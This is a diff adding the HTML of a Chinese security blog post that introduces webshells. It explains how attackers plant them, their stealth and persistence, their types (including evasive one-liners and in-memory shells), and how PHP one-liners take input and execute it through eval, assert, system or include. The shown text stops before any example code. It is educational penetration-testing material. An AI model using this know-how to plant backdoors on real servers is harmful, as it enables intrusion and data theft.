@@ -1,0 +1,1091 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0" theme-name="Stellar" theme-version="1.27.0">
+  
+  <meta name="generator" content="Hexo 7.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>Security-WebShell介绍及使用 - SafeKiller Zone</title>
+
+  
+    <meta name="description" content="总字符数: 31.50K                代码: 15.47K, 文本: 8.27K               预计阅读时间: 1.72 小时              简介 WebShell是一种以网页文件的形式存在的代码执行环境,它可以被称为网页后门.Web表示需要服务器提供Web服务,而Shell表示获取对服务器某种程度上的操作权限. 通常情况下,黑客在入侵一个网站">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Security-WebShell介绍及使用">
+<meta property="og:url" content="https://jiangjiyue.github.io/2024/02/20/449cb93/index.html">
+<meta property="og:site_name" content="SafeKiller Zone">
+<meta property="og:description" content="总字符数: 31.50K                代码: 15.47K, 文本: 8.27K               预计阅读时间: 1.72 小时              简介 WebShell是一种以网页文件的形式存在的代码执行环境,它可以被称为网页后门.Web表示需要服务器提供Web服务,而Shell表示获取对服务器某种程度上的操作权限. 通常情况下,黑客在入侵一个网站">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306051016521.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161200779.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161200632.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161200828.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161200821.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161200940.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161200421.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201718.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201316.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201588.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201696.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201304.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201547.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201015.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201307.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201453.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201169.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201036.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161201073.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202594.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202995.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202922.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202842.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202491.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202079.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202514.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202259.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202206.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202727.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202617.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202098.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202309.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161202668.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203284.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203786.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203415.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203701.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203871.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203578.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203737.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203873.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203685.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203715.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203431.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161203031.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161204209.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161204626.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161204924.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161204078.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161204242.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161204320.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161204645.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161204742.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161204621.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161208610.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161208991.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161208755.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161209381.png">
+<meta property="article:published_time" content="2024-02-20T03:55:15.000Z">
+<meta property="article:modified_time" content="2024-09-23T06:51:28.000Z">
+<meta property="article:author" content="Kill3r">
+<meta property="article:tag" content="信息安全">
+<meta property="article:tag" content="Shell">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306051016521.png">
+  
+  
+  
+  <meta name="keywords" content="信息安全,Shell,渗透测试">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="SafeKiller Zone" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.27.0">
+
+  
+    <link rel="shortcut icon" href="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg">
+  
+
+  
+
+  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" /><link rel="stylesheet" href="/css/darkmode.css">
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">SafeKiller Zone</div><div class="sub normal cap">安全学的再好又有什么用</div><div class="sub hover cap" style="opacity:0"> 连自己喜欢的人都留不住</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="导航" href="/sites/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a><a class="nav-item" title="更多" href="/tools/" style="color:#d55afa"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M22 12c0 5.523-4.477 10-10 10S2 17.523 2 12S6.477 2 12 2s10 4.477 10 10" opacity=".5"/><path fill="currentColor" d="M12.75 9a.75.75 0 0 0-1.5 0v2.25H9a.75.75 0 0 0 0 1.5h2.25V15a.75.75 0 0 0 1.5 0v-2.25H15a.75.75 0 0 0 0-1.5h-2.25z"/></svg></a></nav>
+</div>
+<div class="widgets">
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">专栏：Security-Base</span></div><div class="widget-body"><a class="item" href="/2024/02/08/c44eef61/"><span class="title">Security-会话授权</span></a><a class="item" href="/2024/02/10/c44eef61/"><span class="title">Security-网安专业术语篇</span></a><a class="item" href="/2024/02/12/7564e3ff/"><span class="title">Security-全方位探索网络安全</span></a><a class="item" href="/2024/02/14/dbeaca23/"><span class="title">Security-被动信息收集</span></a><a class="item" href="/2024/02/16/449cb93/"><span class="title">Security-主动信息收集</span></a><a class="item active" href="/2024/02/20/449cb93/"><span class="title">Security-WebShell介绍及使用</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a><a class="item" href="/2024/02/22/449cb93/"><span class="title">Security-反弹Shell大全及使用</span></a></div></widget>
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/2024/11/04/fe2980d6/"><span class="title">CS-ShellCode加载器</span></a><a class="item title" href="/2023/03/11/247b757/"><span class="title">VulHub-Fastjson漏洞复现</span></a><a class="item title" href="/2023/04/28/76971e68/"><span class="title">VulHub-Tomcat漏洞复现</span></a><a class="item title" href="/2024/07/05/dd58c5ed/"><span class="title">应急响应之Webshell流量分析</span></a><a class="item title" href="/2024/10/27/77c80f0f/"><span class="title">CS-C语言总结</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/JiangJiYue/" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-github"></i></a><a class="social" href="javaScript:hud.toast('你在听🎵啦啦啦~');" rel="noopener noreferrer"><i class="fa-solid fa-music"></i></a><a class="social" href="https://space.bilibili.com/238008115" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-bilibili fa-bounce"></i></a><a class="social" href="/atom.xml" rel="noopener noreferrer"><i class="fa-solid fa-rss fa-shake"></i></a><a class="social" href="/comments/" rel="noopener noreferrer"><i class="fa-regular fa-comment-dots"></i></a><a class="social" href="javaScript:void(0);" rel="noopener noreferrer"><i class="fa-solid fa-circle-half-stroke fa-flip"></i></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/topic">专栏</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/2024/02/08/c44eef61/">Security-Base</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-02-20T03:55:15.000Z">2024-02-20</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-09-23T06:51:28.000Z">2024-09-23</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>Security-WebShell介绍及使用</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">
+    <p>总字符数: 31.50K </p>
+    </div>
+    <div class="cell" style="">
+    <p>代码: 15.47K, 文本: 8.27K</p>
+    </div>
+    <div class="cell" style="">
+    <p>预计阅读时间: 1.72 小时</p>
+    </div>
+    </div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306051016521.png" data-fancybox="true"/></div></div>
+
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
+<p><code>WebShell</code>是一种以网页文件的形式存在的代码执行环境,它可以被称为网页后门.<code>Web</code>表示需要服务器提供<code>Web</code>服务,而<code>Shell</code>表示获取对服务器某种程度上的操作权限.</p>
+<p>通常情况下,黑客在入侵一个网站后,会将<code>ASP</code>或<code>PHP</code>后门文件混合在正常的网页文件中,然后可以通过浏览器访问这些后门文件,获得一个命令执行的环境,以达到控制网站服务器的目的.具体步骤如下:</p>
+<ol>
+<li>入侵网站</li>
+<li>将<code>ASP</code>或<code>PHP</code>等后门文件混合在正常的网页文件中</li>
+<li>通过网页访问后门文件</li>
+<li>获得命令执行的环境</li>
+<li>控制网站服务器</li>
+</ol>
+<p><code>Shell</code>文件可以接收来自服务器的数据并执行相应的命令,返回结果.也就是说,只要将<code>Shell</code>文件上传到目标服务器,就可以操控服务器了.</p>
+<p>不法分子利用<code>WebShell</code>可以在Web服务器上执行系统命令、窃取数据、植入病毒、盗取核心数据、进行<code>SEO</code>挂马等恶意操作,造成严重的危害.</p>
+<p>对于网站管理员来说,<code>Shell</code>文件也可以用于网站管理、服务器管理、数据库管理等.根据文件系统对象(<code>FSO</code>)权限的不同,其功能包括在线编辑网页脚本、上传下载文件、查看数据库、执行任意程序命令等.</p>
+</blockquote>
+<h2 id="WebShell特点"><a href="#WebShell特点" class="headerlink" title="WebShell特点"></a>WebShell特点</h2><p>当黑客使用<code>WebShell</code>时,他们通常会将其上传到可以访问的服务器中.</p>
+<p>例如利用用户<code>CMS</code>系统的第三方插件中的漏洞上传一个简单的<code>php WebShell</code>.</p>
+<p><code>WebShell</code>的类型和作用各不相同,有一些简单的<code>WebShell</code>只起到连接外界的作用,允许黑客插入更加精准的恶意脚本,执行他们所需要的指令.</p>
+<p>另外一些<code>WebShell</code>可能更加复杂,带有数据库或文件浏览器,让黑客能够从遥远的地方查看入侵系统的代码和数据.无论设计如何,<code>WebShell</code>都是网络罪犯和高级持续威胁(<code>APT</code>)经常使用的工具.</p>
+<p><code>WebShell</code>的常见攻击特点主要包括以下几点:</p>
+<ol>
+<li>持久化远程访问:<code>WebShell</code>脚本通常包含后门,黑客上传<code>WebShell</code>后,可以利用其中的后门实现远程访问和控制服务器,从而长期控制网站服务器.此外,黑客会修复漏洞,以确保其他人不能利用该漏洞.通过这种方式,黑客可以低调地操作,避免与管理员进行交互,并获得相同的结果.</li>
+<li>提权:在服务器没有配置错误的情况下,<code>WebShell</code>在<code>Web</code>服务器的用户权限下运行,而用户权限是有限的.通过<code>WebShell</code>,黑客可以利用系统上的本地漏洞来提升权限,从而获得<code>Root</code>权限,基本上可以在系统上做任何事情,包括安装软件、更改权限、添加和删除用户、窃取密码、阅读电子邮件等等.</li>
+<li>隐蔽性极强:<code>WebShell</code>可以嵌套在正常网页中运行,不容易被查杀.它还可以穿越服务器防火墙,因为与被控制的服务器或远程主机交互的数据都是通过80端口传输,所以不会被防火墙拦截.在没有记录流量的情况下,<code>WebShell</code>使用<code>POST</code>请求发送数据,也不会在系统日志中留下明显的痕迹,只会在<code>Web</code>日志中记录一些数据提交的记录.</li>
+<li>操作与正常网页相似:<code>WebShell</code>通常通过命令交互界面进行操作,但它的操作方式可以模仿正常网页的表单提交、数据库查询等常见操作,使其不易被怀疑.黑客可以利用<code>WebShell</code>执行各种命令、浏览文件和数据库等,而这些操作与合法用户的正常行为类似</li>
+</ol>
+<p>综上所述,<code>WebShell</code>具有嵌套在正常网页中、穿越服务器防火墙以及操作类似正常网页的特点,使其在黑客攻击中具有极高的隐蔽性.这也增加了检测和防御的难度,提高了<code>WebShell</code>对网络安全的威胁.</p>
+<h2 id="WebShell分类"><a href="#WebShell分类" class="headerlink" title="WebShell分类"></a>WebShell分类</h2><p><code>WebShell</code>根据脚本类型可以分为<code>PHP</code>脚本木马、<code>ASP</code>脚本木马、<code>JSP</code>脚本木马,还有基于<code>.NET</code>的脚本木马.随着时代和技术的变迁,还出现了使用<code>Python</code>和<code>Lua</code>编写的脚本木马,常见的几种分类包括:</p>
+<ol>
+<li>大马<ul>
+<li>体积较大,功能全面</li>
+<li>可调用系统关键函数</li>
+<li>使用代码加密进行隐藏</li>
+</ul>
+</li>
+<li>小马<ul>
+<li>体积较小,功能简单</li>
+<li>一般只具备上传功能,用于上传大马</li>
+</ul>
+</li>
+<li>一句话木马<ul>
+<li>代码简短</li>
+<li>可单独生成文件,也可插入文件</li>
+<li>安全性高,隐藏性强,可变形免杀</li>
+<li>采用固定框架,执行数据操作和传递数据</li>
+<li>可使用中国蚁剑等客户端管理<code>WebShell</code>,省去命令行和参数配置,提供图形化操作界面</li>
+</ul>
+</li>
+<li>打包马<ul>
+<li>主要用于打包网站源代码</li>
+</ul>
+</li>
+<li>拖库马<ul>
+<li>主要用于导出网站数据库</li>
+</ul>
+</li>
+<li>内存马<ul>
+<li>无文件落地,难以检测和发现</li>
+<li>难以清除,具有持久性</li>
+</ul>
+</li>
+</ol>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><code>WebShell</code>的恶意性表现在它的实现功能上,是一段带有恶意目的的正常脚本代码.</p>
+<p>PHP一句话木马核心步骤如下:</p>
+<ol>
+<li>数据传递<ul>
+<li>通过超全局变量获取数据:<code>$_GET</code>、<code>$_POST</code>、<code>$_COOKIES</code>、<code>$_REQUEST</code>、<code>$_FILE</code>、<code>$_SERVER</code></li>
+<li>从远程URL中获取数据:使用函数如<code>file_get_contents</code>、<code>curl</code>、<code>svn_checkout</code>等来获取远程URL中的数据,将需要执行的指令数据放在URL中通过URL包含进行读取.</li>
+<li>从本地磁盘文件中获取数据:使用函数如<code>file</code>、<code>file_get_contents</code>等来读取本地磁盘文件中的数据,将需要执行的指令数据放在文件中利用IO函数读取.</li>
+<li>从数据库中读取:将需要执行的指令放在数据库中,利用数据库操作函数来读取.</li>
+<li>从图片头部中获取:使用函数如<code>exif_read_data</code>来获取图片头部中的数据,将需要执行的指令数据放在图片头部中利用图片操作函数读取.</li>
+</ul>
+</li>
+<li>代码执行<ul>
+<li>将用户传输的数据进行执行.</li>
+<li>代码执行函数:<code>eval</code>、<code>assert</code>、<code>system</code>等函数进行代码执行(最常见的方式).</li>
+<li>LFI(本地文件包含):使用<code>include</code>、<code>require</code>等函数将文件包含转化为代码执行.</li>
+<li>动态函数执行:利用PHP的动态函数特性(如<code>$()</code>)进行代码执行.</li>
+<li>Curly Syntax:使用<code>$&#123;$&#123;...&#125;&#125;</code>等语法进行代码执行,将变量赋值的漏洞转化为代码执行的机会.</li>
+</ul>
+</li>
+</ol>
+<p>下面是一个示例,用于从远程URL中获取数据并执行:</p>
